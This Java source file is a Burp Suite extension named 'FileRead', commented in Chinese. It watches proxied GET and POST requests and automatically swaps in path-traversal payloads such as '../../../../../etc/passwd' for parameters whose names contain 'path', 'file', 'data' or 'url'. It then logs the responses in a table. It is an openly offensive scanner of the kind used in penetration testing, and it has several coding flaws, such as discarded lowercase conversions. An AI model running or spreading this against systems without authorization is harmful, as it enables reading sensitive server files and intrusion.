package burp;


import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;




public class BurpExtender extends AbstractTableModel implements IBurpExtender, IHttpListener, ITab, IScannerCheck, IMessageEditorController {

    // 声明 插件中可以用到变量
    public IBurpExtenderCallbacks callbacks;

    public IExtensionHelpers helpers;

    public    List<IParameter>  parameters ;


    public    String       method;

    public     List<String> headers ;

    public PrintWriter  stdout ;

    public  byte[] request  ;

    public  List<String> payloads = new ArrayList<>();

    public  List<String> Urls = new ArrayList<>();




    public JSplitPane RootPane ; //创建主面板
//    public JSplitPane jSplitPane; //创建记录面板
//    public JSplitPane jSplitPane2;


    private IMessageEditor requestViewer;

    private IMessageEditor responseViewer;

    private IHttpRequestResponse currentlyDisplayedItem;


    public final List<LogEntry> log = new ArrayList<LogEntry>();
    public Table logTable;




    @Override   //IBurpExtender 接口的方法 实现这个方法 就是实现了这个接口
    public void registerExtenderCallbacks( IBurpExtenderCallbacks callbacks) {

                          this.callbacks =  callbacks ;
                          this.helpers=callbacks.getHelpers();
                          this.stdout=   new PrintWriter(callbacks.getStdout(),true);
                          callbacks.registerHttpListener(this);
                          callbacks.registerScannerCheck(this);
                          callbacks.setExtensionName("FileRead");
                          callbacks.printOutput("Author:Mind\n微信公众号: Mind安全点滴\n");
                          SwingUtilities.invokeLater(new Runnable() {
                              @Override
                              public void run() {

                                 RootPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

                                JSplitPane  jSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                                JSplitPane  jSplitPane2= new JSplitPane(JSplitPane.VERTICAL_SPLIT);

                                  logTable = new Table(BurpExtender.this);

                                  JButton Button = new JButton("清除记录") ;

                                  JPanel panel= new JPanel();
                                  panel.setLayout(new GridLayout(18, 1));
                                  panel.add(Button);

                                 jSplitPane2.setLeftComponent(panel);




                                  JScrollPane scrollPane = new JScrollPane(logTable);//先创建对象在放进去
                                  jSplitPane.setLeftComponent(scrollPane);

                                  // tabs with request/response viewers
                                  JTabbedPane tabs = new JTabbedPane();
                                  requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                                  responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                                  tabs.addTab("Request", requestViewer.getComponent());
                                  tabs.addTab("Response", responseViewer.getComponent());

                                  jSplitPane.setRightComponent(tabs);

                                  //整体分布
                                  RootPane.setLeftComponent(jSplitPane);
                                  RootPane.setRightComponent(jSplitPane2);
                                  RootPane.setDividerLocation(1000);

                                  BurpExtender.this.callbacks.customizeUiComponent(RootPane);
                                  BurpExtender.this.callbacks.customizeUiComponent(logTable);
                                  BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                                  BurpExtender.this.callbacks.customizeUiComponent(panel);
                                  BurpExtender.this.callbacks.customizeUiComponent(tabs);

                                  BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);

                                  Button.addActionListener(new ActionListener() {
                                      @Override
                                      public void actionPerformed(ActionEvent e) {
                                          log.clear();
                                          BurpExtender.this.fireTableDataChanged();

                                      }
                                  });


                              }
                          });

        payloads.add("../../../../../etc/passwd");

        payloads.add("../../../../../etc/host");


    }

    @Override   //IHttpListener   接口的方法 ，实现这个接口，便是实现了这个方法
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
//         拿到 请求包的详情
//        IRequestInfo request = this.helpers.analyzeRequest(messageInfo) ;


        if( toolFlag == 4 || toolFlag == 64 ) {
            String method = this.helpers.analyzeRequest(messageInfo).getMethod();
            String path = String.valueOf(this.helpers.analyzeRequest(messageInfo).getUrl());


            if (Urls.contains(path)) {

                stdout.println("重复请求");
            }

               else {

                Urls.add(path)   ;

                if (method.equals("GET")) {

                    IHttpService httpService = messageInfo.getHttpService();


//          String host = httpService.getHost();
                    parameters = this.helpers.analyzeRequest(messageInfo).getParameters();

                    stdout.println(path);

                    headers = this.helpers.analyzeRequest(messageInfo).getHeaders();


                    Iterator var8 = parameters.iterator();

                    while (var8.hasNext() == true) {


                        IParameter para = (IParameter) var8.next();
                        String name = para.getName();

                        name.toLowerCase();
                        if ((name.contains("path") || name.contains("file") || name.contains("data") || name.contains("url"))) {
                            request = messageInfo.getRequest();
                            stdout.println(name);


                            BurpExtender.this.Request(payloads, httpService, request, para);

                        }
                    }

//                for (IParameter para : parameters) {
//                    String name = para.getName();
//
//                    stdout.println(name);
//                    if (name.contains("WT_FPC")) {
//
//                        request = messageInfo.getRequest();
//
//                        BurpExtender.this.Request(payloads, httpService, request, para);
//
//                    }

//                    break;
//
//                }

                }

                if (method.equals("POST")) {

                    IHttpService httpService = messageInfo.getHttpService();

                    parameters = this.helpers.analyzeRequest(messageInfo).getParameters();


                    headers = this.helpers.analyzeRequest(messageInfo).getHeaders();

                    Iterator var8 = parameters.iterator();

                    while (var8.hasNext() == true) {


                        IParameter para = (IParameter) var8.next();
                        String name = para.getName();
                        name.toLowerCase();

                        if ((name.contains("path") || name.contains("file") || name.contains("data") || name.contains("url"))) {

                            request = messageInfo.getRequest();
                            stdout.println(name);
                            BurpExtender.this.Request(payloads, httpService, request, para);
                        }
                    }


                }

            }
        }

    }


    @Override
    public String getTabCaption() {
        return "FileRead";
    }

    @Override  // ITab的方法 实现这个方法  实现了Iab 接口 burp插件实际展示的窗口，返回根面板
    public Component getUiComponent() {

        return   RootPane;
    }


    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    public  void Request(List<String> Payloads,IHttpService httpService, byte[] request,IParameter parameter){


                  IParameter para = parameter ;
                  String name = para.getName();
                 for(int i =0 ;i<payloads.size();i++) {
                     String value = para.getValue();
                     IParameter newParameter = this.helpers.buildParameter(name, payloads.get(i), para.getType());
                     byte[] newrequest = this.helpers.updateParameter(request, newParameter);

                     IHttpRequestResponse newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newrequest);
                     byte[] newresponse = newIHttpRequestResponse.getResponse();
                     IResponseInfo response = this.helpers.analyzeResponse(newresponse);
//                     List<String> responseheader = response.getHeaders();
                String statusCode = String.valueOf(response.getStatusCode());



                     LogEntry logEntry = new LogEntry(helpers.analyzeRequest(newIHttpRequestResponse).getUrl().toString(), statusCode, "",  newIHttpRequestResponse);

                     //刷新第一个列表框
                     log.add(logEntry);
                     stdout.println("添加");
                     BurpExtender.this.fireTableDataChanged();// size的值，不固定时，通过刷新列表框，展示实时数据

                     stdout.println(statusCode);
                     stdout.println(log.size());

                 }

    }

    public void IsContains(String name){

//        不区分大小写   ，还没有测试验证
        name.toLowerCase();
//      if (name.contains("Path")|| name.contains("path") || name.contains("file") || name.contains("Data")||name.contains("url")) {
        if ((name.contains("Path")|| name.contains("file") || name.contains("Data")||name.contains("url")) ==true){


        }


    }

    @Override
    public int getRowCount() {
        return this.log.size();
    }

    @Override
    public int getColumnCount() {
        return 4;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url;
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "result";
            default:
                return "";
        }
    }


    // 用于描述一条请求记录的数据结构
    private static class LogEntry{
        final String url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(String url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }


    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }


        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;

            super.changeSelection(row, col, toggle, extend);
        }
    }



    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }
}
